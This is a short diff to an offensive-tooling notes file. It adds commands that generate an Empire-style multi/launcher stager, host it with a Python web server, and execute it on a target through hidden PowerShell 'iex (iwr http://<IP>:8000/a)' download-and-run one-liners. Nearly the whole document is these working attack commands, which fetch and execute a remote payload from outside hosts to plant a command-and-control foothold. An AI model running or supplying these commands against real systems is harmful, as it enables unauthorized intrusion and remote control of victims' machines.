@@ -2,11 +2,23 @@
 # also good when you have a limited size constraint, such as in shellcode or manual typing.
 
 # create a multi/launcher without base64 encoding
+usestager multi/launcher
+set Listener http
+set OutFile /tmp/a
+set Base64 False
+generate
+
 # save the launcher output to a file and host that on a webserver. Maybe even Github
 # get a shortened URL to the host, or memorize the IP.
+# or start a webserver on your host
+cd /tmp
+python -m SimpleHTTPServer 8000
+
+
 # Execute stage0 on a host, could be shellcode, or just execution
-iex (iwr http://bit.ly/xxxxxx/index.html).rawcontent
+iex (iwr http://124.125.126.127:8000/a).rawcontent
 
 # or if you need to kick off powershell as well
-powershell.exe -NoP -sta -NonI -W Hidden "iex (iwr http://bit.ly/xxxxxx/index.html).content"
+powershell.exe -NoP -sta -NonI -W Hidden "iex (iwr http://bit.ly/xxxxxx/index.html).rawcontent"
+powershell.exe -NoP -sta -NonI -W Hidden "iex (iwr http://215.65.17.253:8000/a).rawcontent"
 
